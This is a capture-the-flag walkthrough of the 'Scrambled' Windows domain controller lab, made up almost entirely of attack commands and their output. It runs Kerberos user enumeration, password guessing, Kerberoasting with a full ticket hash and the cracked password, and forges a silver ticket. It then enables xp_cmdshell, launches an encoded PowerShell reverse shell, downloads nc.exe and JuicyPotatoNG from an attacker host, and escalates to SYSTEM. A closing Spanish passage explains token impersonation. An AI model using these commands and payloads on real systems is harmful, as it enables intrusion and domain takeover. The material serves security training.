### SCRAMBLED

```bash
nmap -p- -sSVC --min-rate 5000 10.10.11.168 -Pn -nvvvv -oN allPorts
PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
80/tcp    open  http          syn-ack ttl 127 Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-title: Scramble Corp Intranet
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-05-04 08:56:32Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name)
|_ssl-date: 2025-05-04T08:59:41+00:00; -8h00m01s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC1.scrm.local
| Issuer: commonName=scrm-DC1-CA/domainComponent=scrm
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2024-09-04T11:14:45
| Not valid after:  2121-06-08T22:39:53
| MD5:   2ca2:5511:c96e:d5c5:3601:17f2:c316:7ea3
| SHA-1: 9532:78bb:e082:70b2:5f2e:7467:6f7d:a61d:1918:685e
| -----BEGIN CERTIFICATE-----
<SNIP>
|_-----END CERTIFICATE-----
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC1.scrm.local
| Issuer: commonName=scrm-DC1-CA/domainComponent=scrm
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2024-09-04T11:14:45
| Not valid after:  2121-06-08T22:39:53
| MD5:   2ca2:5511:c96e:d5c5:3601:17f2:c316:7ea3
| SHA-1: 9532:78bb:e082:70b2:5f2e:7467:6f7d:a61d:1918:685e
| -----BEGIN CERTIFICATE-----
<SNIP>
|_-----END CERTIFICATE-----
|_ssl-date: 2025-05-04T08:59:41+00:00; -8h00m01s from scanner time.
1433/tcp  open  ms-sql-s      syn-ack ttl 127 Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-info: 
|   10.10.11.168:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
|_ssl-date: 2025-05-04T08:59:41+00:00; -8h00m01s from scanner time.
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Issuer: commonName=SSL_Self_Signed_Fallback
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-05-04T08:53:50
| Not valid after:  2055-05-04T08:53:50
| MD5:   70e8:fa16:d6f9:2209:7277:31df:c402:6fc6
| SHA-1: 36e4:5122:421a:68dc:97f0:b7c2:9ab0:c6bd:ed04:0d71
| -----BEGIN CERTIFICATE-----
| <SNIP>
| cLbVfA==
|_-----END CERTIFICATE-----
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name)
|_ssl-date: 2025-05-04T08:59:41+00:00; -8h00m01s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC1.scrm.local
| Issuer: commonName=scrm-DC1-CA/domainComponent=scrm
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2024-09-04T11:14:45
| Not valid after:  2121-06-08T22:39:53
| MD5:   2ca2:5511:c96e:d5c5:3601:17f2:c316:7ea3
| SHA-1: 9532:78bb:e082:70b2:5f2e:7467:6f7d:a61d:1918:685e
| -----BEGIN CERTIFICATE-----
| <SNIP>
|_-----END CERTIFICATE-----
3269/tcp  open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC1.scrm.local
| Issuer: commonName=scrm-DC1-CA/domainComponent=scrm
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2024-09-04T11:14:45
| Not valid after:  2121-06-08T22:39:53
| MD5:   2ca2:5511:c96e:d5c5:3601:17f2:c316:7ea3
| SHA-1: 9532:78bb:e082:70b2:5f2e:7467:6f7d:a61d:1918:685e
| -----BEGIN CERTIFICATE-----
| <SNIP>
|_-----END CERTIFICATE-----
|_ssl-date: 2025-05-04T08:59:41+00:00; -8h00m01s from scanner time.
4411/tcp  open  found?        syn-ack ttl 127
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, GenericLines, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, NCP, NULL, NotesRPC, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe, afp, giop, ms-sql-s, oracle-tns: 
|     SCRAMBLECORP_ORDERS_V1.0.3;
|   FourOhFourRequest, GetRequest, HTTPOptions, Help, LPDString, RTSPRequest, SIPOptions: 
|     SCRAMBLECORP_ORDERS_V1.0.3;
|_    ERROR_UNKNOWN_COMMAND;
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49673/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49716/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49720/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC

```

```bash
crackmapexec smb 10.10.11.168                                                              
SMB         10.10.11.168    445    10.10.11.168     [*]  x64 (name:10.10.11.168) (domain:10.10.11.168) (signing:True) (SMBv1:False)

crackmapexec smb 10.10.11.168 -u '' -p ''
SMB         10.10.11.168    445    10.10.11.168     [*]  x64 (name:10.10.11.168) (domain:10.10.11.168) (signing:True) (SMBv1:False)
SMB         10.10.11.168    445    10.10.11.168     [-] 10.10.11.168\: STATUS_NOT_SUPPORTED <--------
```

"**Due to the security breach last month we have now disabled all NTLM authentication on our network. This may cause problems for some of the programs you use so please be patient while we work to resolve any issues**"
```bash
kerbrute userenum -d scrm.local --dc 10.10.11.168 /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -t 15
2025/05/04 11:08:58 >  [+] VALID USERNAME:       administrator@scrm.local
2025/05/04 11:09:13 >  [+] VALID USERNAME:       asmith@scrm.local
2025/05/04 11:09:35 >  [+] VALID USERNAME:       Administrator@scrm.local
2025/05/04 11:09:53 >  [+] VALID USERNAME:       jhall@scrm.local
2025/05/04 11:13:06 >  [+] VALID USERNAME:       sjenkins@scrm.local
2025/05/04 11:13:23 >  [+] VALID USERNAME:       khicks@scrm.local
2025/05/04 11:16:00 >  [+] VALID USERNAME:       Asmith@scrm.local
2025/05/04 11:22:04 >  [+] VALID USERNAME:       ASMITH@scrm.local
2025/05/04 11:22:04 >  [+] VALID USERNAME:       ksimpson@scrm.local
```

```bash
GetNPUsers.py  -no-pass -usersfile users scrm.local/
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

/home/priv4te/.local/bin/GetNPUsers.py:165: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  now = datetime.datetime.utcnow() + datetime.timedelta(days=1)
[-] User administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User asmith doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User jhall doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User sjenkins doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User khicks doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User ksimpson doesn't have UF_DONT_REQUIRE_PREAUTH set
```

```bash
kerbrute bruteuser -d scrm.local --dc 10.10.11.168 users ksimpson
2025/05/04 11:26:57 >  [+] VALID LOGIN:  ksimpson@scrm.local:ksimpson
```

```bash
impacket-GetUserSPNs scrm.local/ksimpson:ksimpson -dc-ip 10.10.11.168 -dc-host dc1.scrm.local -k -request
MSSQLSvc/dc1.scrm.local:1433  sqlsvc            2021-11-03 17:32:02.351452  2025-05-04 10:53:47.460853             
MSSQLSvc/dc1.scrm.local       sqlsvc            2021-11-03 17:32:02.351452  2025-05-04 10:53:47.460853    

$krb5tgs$23$*sqlsvc$SCRM.LOCAL$scrm.local/sqlsvc*$ec69919538d8711a88efd015fc5d81d8$82f9698d3b6764b5a221536fb39a12f7245ea59a695a0d9f16feb169e5407e93a148be09e920870c94e6cc7faad29db1d7fbe17cf8fdcbea3145e3adaac3777bdcd9f8ef9d0ee9a739596d67d0bc325709c2d94310f7dd75ca4dd1e83715c94ef58317a0d28693515c778f5da8726cc2bc1652d41144fc6458d336be61ff5b3b65f66e71c92a43dfa724d07bb78452e9cbf512efe2570121a194ea97aaf0ff83a72ed2b19676fd989b8d9e430e9789b721b5a4a4dcad55c0b68c383864b931696e6ed234b99561d0aaba7a21d861a69d8b40e8cfb127c6201f6952809183dc7464f99f19236bf1cfa97dd867fb83b8b9a7b4a18dbda2d6b8924d4a5094aae3f6afc8a6f68d6d700ec908b3e24e337c27a671fae0d667b1ac23c40c8c51d0cd153e78f81fac1826bd4c55fd4195bc2535c1de51aa2db01ef82987654b08cce9047deeb85d91beaa225aa61fbb4a18b2850b3157fde5566706ef788af8976f9228097bfdc359d3a3a0d82a14d9525814af2ad0a2f1a623982835c26953f36486fdc43741927fadc223eeb1ed99ce48920872e99e2f90787d5fee1e8be42956d91cc100f291843c61677cb59ec16288a5ee811b345cb84d1dcd479dfa09ed89c8a90453e84648f7d46062aa19c3403846905efc86812712b5a5f45de89f7623555441541dc7f4fb725bbae05028652f96d7748fe55f3462549fe0d2b2bed1c0b6b7c419d0237cdff4205781135f80ea85d5ed38e5166421a9f4933133b69f8f539fcd1783b8a21c41254505c01c36b4e1bc6b39553e2c4ba4728fc78319f6c9dbde208b27c0f1dc3f3e479e4c9d8b254c9bdcbd78f25daab1f52aae3fe6b6cdb1793c4c005d662df770addf74e81947077ffee0b580d7d46ed79ebb4aca31e1ee0379f14d44e64fece89665706e6fc6707d0c77c38479b42b6ad81781e5026b03adc5ac7e6ccd73a0cd4384ac3b448f8622443790afc89469a4781401ba6b12251d768458fd071c83c7f47d8a8c43f78cd6c0c666d5650291cda3d5bc836afa9a43c86254c389f05028cf5631ce42fdb697c8db492a42f7ec2ef30a2d08b137f481f75ecfb51678a8892504456509742bb0aa69f8cc35e5ecf5bfa20c09155b7c7012d89766e2254d58f0e5dd14ed74f39a2b40af790cfb53220cce5c290b356f1df8a33ae0b862d23b45c4cd6659967436c809ccf6ad9c135179618b4351ed725d167c4516f213b31790d229f7ef292abe122278a584cd3da9d2dbfd61e76b87ddd81fee5530e1b57b84e1a0a8f2e433bf5117055b777c8152fcfe8e15fa8c16101ef10fa20b5288c401e78c53d4fb8f4765c8095ddf18d822d04a86f4656104886e69b2a7f3936cad0b6c7de6a3c0452b852e0225c267f85997f5d63ff26535af08a8572db5bfce71760a9047af6255b70caae6f3272d5eaf512466

```

```bash
hashcat -m 13100 hash /usr/share/wordlists/rockyou.txt
->>>  Pegasus60
```

```bash
 impacket-mssqlclient scrm.local/sqlsvc:Pegasus60@10.10.11.168  
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[-] ERROR(DC1): Line 1: Login failed for user 'sqlsvc'.

```

```bash
impacket-getTGT scrm.local/sqlsvc:Pegasus60
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in sqlsvc.ccache
export KRB5CCACHE=sqlsvc.ccache
```

```bash
mssqlclient.py dc1.scrm.local -k
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[-] ERROR(DC1): Line 1: Login failed for user 'SCRM\sqlsvc'.

```
SILVER TICKET ATTACK
```bash
1. b999a16500b87d17ec7f2e2a68778f05 -> hashNTLM -> ntlm generator
2. SPN -> MSSQLSvc/dc1.scrm.local
3. impacket-getPac scrm.local/ksimpson:ksimpson -targetUser Administrator
Domain SID: S-1-5-21-2743207045-1827831105-2542523200
```

```bash
impacket-ticketer -spn MSSQLSvc/dc1.scrm.local -domain-sid 'S-1-5-21-2743207045-1827831105-2542523200' -dc-ip dc1.scrm.local -nthash b999a16500b87d17ec7f2e2a68778f05 -domain scrm.local Administrator

]     EncTGSRepPart
[*] Signing/Encrypting final ticket
[*]     PAC_SERVER_CHECKSUM
[*]     PAC_PRIVSVR_CHECKSUM
[*]     EncTicketPart
[*]     EncTGSRepPart
[*] Saving ticket in Administrator.ccache

```

```bash
export KRB5CCNAME=Administrator.ccache 

mssqlclient.py dc1.scrm.local -k

SQL (SCRM\administrator  dbo@master)> xp_cmdshell "whoami"
ERROR(DC1): Line 1: SQL Server blocked access to procedure 'sys.xp_cmdshell' of component 'xp_cmdshell' because this component is turned off as part of the security configuration for this server. A system administrator can enable the use of 'xp_cmdshell' by using sp_configure. For more information about enabling 'xp_cmdshell', search for 'xp_cmdshell' in SQL Server Books Online.

```

```bash
SQL (SCRM\administrator  dbo@master)> sp_configure "show advanced options",1
SQL (SCRM\administrator  dbo@master)> reconfigure
SQL (SCRM\administrator  dbo@master)> sp_configure "xp_cmdshell",1
SQL (SCRM\administrator  dbo@master)> reconfigure
SQL (SCRM\administrator  dbo@master)> xp_cmdshell "whoami"
output        
-----------   
scrm\sqlsvc   
```

```bash
SQL (SCRM\administrator  dbo@master)> xp_cmdshell "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMQA3ACIALAA0ADQAMwApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA="

```

```bash
rlwrap -cAr nc -lvnp 443  
listening on [any] 443 ...
connect to [10.10.14.17] from (UNKNOWN) [10.10.11.168] 65020
whoami
scrm\sqlsvc
PS C:\Windows\system32> 
```

```bash
PS C:\Users\sqlsvc\Desktop> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeMachineAccountPrivilege     Add workstations to domain                Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled

```

```bash
PS C:\Windows\system32> systeminfo

Host Name:                 DC1
OS Name:                   Microsoft Windows Server 2019 Standard

```
juicypotato AnotnioCoco NG
```bash
PS C:\Windows\system32> cd C:\Temp

PS C:\Temp> curl 10.10.14.17/nc.exe -o nc.exe
PS C:\Temp> mkdir privesc

PS C:\Temp\privesc> curl 10.10.14.17/juicy.exe -o jp.exe

```

```bash
 .\jp.exe -t * -p C:\Windows\System32\cmd.exe -a "/c C:\Temp\nc.exe -e cmd 10.10.14.17 4444"


         JuicyPotatoNG
         by decoder_it & splinter_code

[*] Testing CLSID {854A20FB-2D44-457D-992F-EF13785D2B51} - COM server port 10247 
[-] The privileged process failed to communicate with our COM Server :( Try a different COM port in the -l flag. 

```

```bash
PS C:\Temp\privesc> .\jp.exe -t * -p C:\Windows\System32\cmd.exe -a "/c C:\Temp\nc.exe -e cmd 10.10.14.17 4444" -l 443

```

```bash
nc -lvnp 4444                   
listening on [any] 4444 ...
connect to [10.10.14.17] from (UNKNOWN) [10.10.11.168] 57261
Microsoft Windows [Version 10.0.17763.2989]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\>whoami
whoami
nt authority\system

```

#### JUicyPotato
Juicy Potato es una herramienta que permite elevar privilegios  co usuarios que tienen SeImpersontePrivilege.

**COM**: Component Object Model es una tecnologia de windows que permite la comunicacion entre programas

**CLSID**: Es el identifiador del servicio COM

EL suuario con JuicyPotato lanza un servicio COM falso y utiliza un CLSID de un COM que este corriendo como SYSTEM y el proceso SYSTEM se conecta a nuestro COM y ganamos acceso y ya con eso podemos lanzar culauqier progrma como system ejem: cmd.exe

SeImpersonatePrivilege me permite "robar" tokens(Indica usuario y permisos) si alguien se conecta a mi.
